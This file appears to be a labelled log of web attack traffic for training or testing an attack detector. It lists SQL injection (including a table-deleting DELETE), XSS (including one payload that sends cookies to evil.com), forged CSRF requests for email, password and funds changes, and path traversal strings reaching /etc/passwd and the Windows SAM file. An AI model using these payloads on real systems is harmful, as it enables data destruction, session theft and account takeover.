timestamp,attack_type,payload_snippet,label,status_code,blocked
2026-06-22T15:11:49.239943,sqli,'; DELETE FROM products WHERE 1=1--,1,N/A,False
2026-06-22T15:11:51.592796,sqli,'; DELETE FROM products WHERE 1=1--,1,N/A,False
2026-06-22T15:11:54.024786,sqli,'; WAITFOR DELAY '00:00:05'--,1,N/A,False
2026-06-22T15:11:56.300883,sqli,' OR 1=1--,1,N/A,False
2026-06-22T15:11:59.407200,sqli,' AND 1=1--,1,N/A,False
2026-06-22T15:12:02.472040,sqli,"' UNION SELECT @@version,NULL,NULL--",1,N/A,False
2026-06-22T15:12:04.861180,sqli,"' UNION SELECT NULL,NULL,NULL--",1,N/A,False
2026-06-22T15:12:07.300512,sqli,"' UNION SELECT @@version,NULL,NULL--",1,N/A,False
2026-06-22T15:12:09.626262,sqli,' OR 1=1--,1,N/A,False
2026-06-22T15:12:12.663627,sqli,' AND SLEEP(5)--,1,N/A,False
2026-06-22T15:12:15.105837,sqli,admin'--,1,N/A,False
2026-06-22T15:12:17.317265,sqli,"' UNION SELECT NULL,NULL,NULL--",1,N/A,False
2026-06-22T15:12:20.439386,sqli,"' UNION SELECT NULL,NULL,NULL--",1,N/A,False
2026-06-22T15:12:23.441394,sqli,admin'--,1,N/A,False
2026-06-22T15:12:25.861232,sqli,admin'--,1,N/A,False
2026-06-22T15:12:28.329134,benign,normal_request,0,N/A,False
2026-06-22T15:12:30.834425,benign,normal_request,0,200,False
2026-06-22T15:12:33.714735,benign,normal_request,0,201,False
2026-06-22T15:12:36.376471,benign,normal_request,0,201,False
2026-06-22T15:12:39.065432,benign,normal_request,0,200,False
2026-06-22T15:12:41.674294,benign,normal_request,0,200,False
2026-06-22T15:12:44.530512,benign,normal_request,0,N/A,False
2026-06-22T15:12:47.196065,benign,normal_request,0,N/A,False
2026-06-22T15:12:49.545532,benign,normal_request,0,N/A,False
2026-06-22T15:12:51.913254,benign,normal_request,0,201,False
2026-06-22T15:12:54.497024,xss,<input onfocus=alert(1) autofocus>,1,201,False
2026-06-22T15:12:56.778291,xss,<script>alert(document.cookie)</script>,1,201,False
2026-06-22T15:12:59.028733,xss,<input onfocus=alert(1) autofocus>,1,201,False
2026-06-22T15:13:01.386151,xss,<scr<script>ipt>alert(1)</scr</script>ipt>,1,201,False
2026-06-22T15:13:03.646095,xss,<scr<script>ipt>alert(1)</scr</script>ipt>,1,201,False
2026-06-22T15:13:05.814070,xss,<input onfocus=alert(1) autofocus>,1,201,False
2026-06-22T15:13:08.130948,xss,<script>fetch('http://evil.com/?c='+document.cookie)</script>,1,201,False
2026-06-22T15:13:10.349818,xss,<script>alert(document.cookie)</script>,1,201,False
2026-06-22T15:13:12.549090,xss,<script>alert(document.cookie)</script>,1,201,False
2026-06-22T15:13:14.859615,xss,<input onfocus=alert(1) autofocus>,1,201,False
2026-06-22T15:13:17.050818,xss,<iframe src='javascript:alert(1)'>,1,201,False
2026-06-22T15:13:19.370252,xss,<iframe src='javascript:alert(1)'>,1,201,False
2026-06-22T15:13:21.756446,benign,normal_request,0,N/A,False
2026-06-22T15:13:24.399144,benign,normal_request,0,N/A,False
2026-06-22T15:13:27.136401,benign,normal_request,0,N/A,False
2026-06-22T15:13:29.394653,benign,normal_request,0,N/A,False
2026-06-22T15:13:31.952872,benign,normal_request,0,201,False
2026-06-22T15:13:34.411194,benign,normal_request,0,N/A,False
2026-06-22T15:13:37.261757,benign,normal_request,0,200,False
2026-06-22T15:13:39.788158,benign,normal_request,0,201,False
2026-06-22T15:13:42.134771,csrf,"{""action"": ""update_email"", ""email"": ""attacker@evil.com""}",1,201,False
2026-06-22T15:13:44.451052,csrf,"{""action"": ""change_password"", ""new_password"": ""hacked123""}",1,201,False
2026-06-22T15:13:47.002766,csrf,"{""action"": ""update_email"", ""email"": ""attacker@evil.com""}",1,201,False
2026-06-22T15:13:49.448330,csrf,"{""action"": ""transfer_funds"", ""amount"": 5000, ""to"": ""attacker""}",1,201,False
2026-06-22T15:13:52.019919,csrf,"{""action"": ""transfer_funds"", ""amount"": 5000, ""to"": ""attacker""}",1,201,False
2026-06-22T15:13:54.335431,csrf,"{""action"": ""transfer_funds"", ""amount"": 5000, ""to"": ""attacker""}",1,201,False
2026-06-22T15:13:56.889933,csrf,"{""action"": ""update_email"", ""email"": ""attacker@evil.com""}",1,201,False
2026-06-22T15:13:59.215685,csrf,"{""action"": ""update_email"", ""email"": ""attacker@evil.com""}",1,201,False
2026-06-22T15:14:01.526555,csrf,"{""action"": ""update_email"", ""email"": ""attacker@evil.com""}",1,201,False
2026-06-22T15:14:04.038111,csrf,"{""action"": ""update_email"", ""email"": ""attacker@evil.com""}",1,201,False
2026-06-22T15:14:06.550173,benign,normal_request,0,N/A,False
2026-06-22T15:14:08.870509,benign,normal_request,0,N/A,False
2026-06-22T15:14:11.399331,benign,normal_request,0,201,False
2026-06-22T15:14:14.117165,benign,normal_request,0,201,False
2026-06-22T15:14:16.488819,benign,normal_request,0,201,False
2026-06-22T15:14:18.858903,benign,normal_request,0,201,False
2026-06-22T15:14:21.363966,path_traversal,%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1,N/A,False
2026-06-22T15:14:21.543557,path_traversal,....//....//....//etc/passwd,1,N/A,False
2026-06-22T15:14:21.887560,path_traversal,%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1,N/A,False
2026-06-22T15:14:22.181298,path_traversal,..%252f..%252f..%252fetc%252fpasswd,1,N/A,False
2026-06-22T15:14:24.576872,path_traversal,..%252f..%252f..%252fetc%252fpasswd,1,N/A,False
2026-06-22T15:14:27.061520,path_traversal,..%252f..%252f..%252fetc%252fpasswd,1,N/A,False
2026-06-22T15:14:27.445996,path_traversal,..\..\..\windows\system32\config\sam,1,N/A,False
